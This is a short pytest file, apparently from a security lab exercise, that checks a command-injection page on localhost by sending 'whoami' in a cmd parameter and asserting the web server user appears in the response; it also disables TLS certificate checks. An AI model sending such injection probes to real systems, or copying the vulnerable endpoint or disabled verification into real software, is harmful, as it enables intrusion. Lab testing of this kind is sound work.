import pytest
import requests
import urllib3
try:
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    # surpress Unverified HTTPS request warning, due to self signed cert
except Exception as e:
    print(f'An exception has occurred while disabling warnings: {e}')


def test_helloworld():
    # Pytest for act7 to test cmd injection
    params = {'cmd': 'whoami'}
    resp = requests.get(
        'https://127.0.0.1/injection.php',
        params=params,
        verify=False)
    assert 'www-data' in resp.text
    assert 200 == resp.status_code


if __name__ == '__main__':
    pytest.main()
